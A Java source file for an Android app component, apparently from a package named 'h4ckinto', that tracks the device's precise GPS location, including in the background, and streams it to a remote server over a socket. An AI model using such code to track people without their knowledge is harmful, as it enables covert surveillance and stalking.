package com.h4ckinto.android.managers;

import android.Manifest;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionManager;

public class LocationManager {
    private static final String TAG = "LocationManager";
    private static final int LOCATION_UPDATE_REQUEST_CODE = 1001;
    
    private Context context;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private PendingIntent locationPendingIntent;
    private SocketManager socketManager;
    private boolean isTracking = false;

    public LocationManager(Context context) {
        this.context = context;
        this.socketManager = SocketManager.getInstance(context);
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
        setupLocationCallback();
        setupLocationPendingIntent();
    }

    private void setupLocationCallback() {
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) {
                    return;
                }
                
                for (Location location : locationResult.getLocations()) {
                    if (location != null) {
                        sendLocationToServer(location);
                    }
                }
            }
        };
    }

    private void setupLocationPendingIntent() {
        Intent intent = new Intent(context, LocationUpdateReceiver.class);
        intent.setAction("com.h4ckinto.android.LOCATION_UPDATE");
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        locationPendingIntent = PendingIntent.getBroadcast(context, LOCATION_UPDATE_REQUEST_CODE, intent, flags);
    }

    public void startLocationTracking() {
        if (!PermissionManager.hasLocationPermissions(context)) {
            Log.w(TAG, "Location permissions not granted");
            return;
        }

        if (isTracking) {
            Log.d(TAG, "Location tracking already started");
            return;
        }

        try {
            LocationRequest locationRequest = LocationRequest.create();
            locationRequest.setInterval(Constants.GPS_UPDATE_INTERVAL);
            locationRequest.setFastestInterval(Constants.GPS_FASTEST_INTERVAL);
            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
            locationRequest.setSmallestDisplacement(Constants.GPS_MIN_DISTANCE);
            // Set max wait time to ensure updates even when device is idle
            locationRequest.setMaxWaitTime(Constants.GPS_UPDATE_INTERVAL * 2);

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                // For Android 10+ (API 29+), use PendingIntent for background location
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // Check for background location permission
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        fusedLocationClient.requestLocationUpdates(locationRequest, locationPendingIntent);
                        Log.d(TAG, "Location tracking started with PendingIntent (background mode)");
                    } else {
                        // Fallback to callback for foreground (will work when app is in foreground)
                        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, context.getMainLooper());
                        Log.d(TAG, "Location tracking started with callback (foreground mode - background permission needed)");
                    }
                } else {
                    // For Android 9 and below, use callback
                    fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, context.getMainLooper());
                    Log.d(TAG, "Location tracking started with callback");
                }
                
                isTracking = true;
                Log.d(TAG, "Location tracking started successfully");
                
                // Immediately get current location when tracking starts
                getLastKnownLocation();
                
                // Also request a fresh location update
                requestCurrentLocation();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in startLocationTracking", e);
        }
    }
    
    public void requestCurrentLocation() {
        if (!PermissionManager.hasLocationPermissions(context)) {
            Log.w(TAG, "Location permissions not granted");
            return;
        }

        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                // Request a single high-accuracy location update
                LocationRequest oneTimeRequest = LocationRequest.create();
                oneTimeRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
                oneTimeRequest.setNumUpdates(1);
                oneTimeRequest.setMaxWaitTime(10000); // Wait max 10 seconds
                
                fusedLocationClient.requestLocationUpdates(oneTimeRequest, new LocationCallback() {
                    @Override
                    public void onLocationResult(LocationResult locationResult) {
                        if (locationResult != null && locationResult.getLastLocation() != null) {
                            Location location = locationResult.getLastLocation();
                            sendLocationToServer(location);
                            // Remove this one-time callback
                            fusedLocationClient.removeLocationUpdates(this);
                        }
                    }
                }, context.getMainLooper());
                
                Log.d(TAG, "Requested current location update");
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in requestCurrentLocation", e);
        }
    }

    public void stopLocationTracking() {
        if (!isTracking) {
            Log.d(TAG, "Location tracking not started");
            return;
        }

        try {
            // Remove both callback and pending intent updates
            if (locationCallback != null) {
        fusedLocationClient.removeLocationUpdates(locationCallback);
            }
            if (locationPendingIntent != null) {
                fusedLocationClient.removeLocationUpdates(locationPendingIntent);
            }
        isTracking = false;
        Log.d(TAG, "Location tracking stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping location tracking", e);
        }
    }

    public void getLastKnownLocation() {
        if (!PermissionManager.hasLocationPermissions(context)) {
            Log.w(TAG, "Location permissions not granted");
            return;
        }

        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                fusedLocationClient.getLastLocation()
                    .addOnSuccessListener(location -> {
                        if (location != null) {
                            sendLocationToServer(location);
                        } else {
                            Log.w(TAG, "Last known location is null");
                        }
                    })
                    .addOnFailureListener(e -> {
                        Log.e(TAG, "Failed to get last known location", e);
                    });
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in getLastKnownLocation", e);
        }
    }

    private void sendLocationToServer(Location location) {
        if (socketManager.isConnected()) {
            socketManager.sendLocation(
                location.getLatitude(),
                location.getLongitude(),
                location.getAltitude(),
                location.getAccuracy(),
                location.getSpeed()
            );
            Log.d(TAG, "Location sent to server: " + location.getLatitude() + ", " + location.getLongitude());
        } else {
            Log.w(TAG, "Socket not connected, cannot send location");
        }
    }

    public boolean isTracking() {
        return isTracking;
    }

    public void destroy() {
        stopLocationTracking();
    }
}
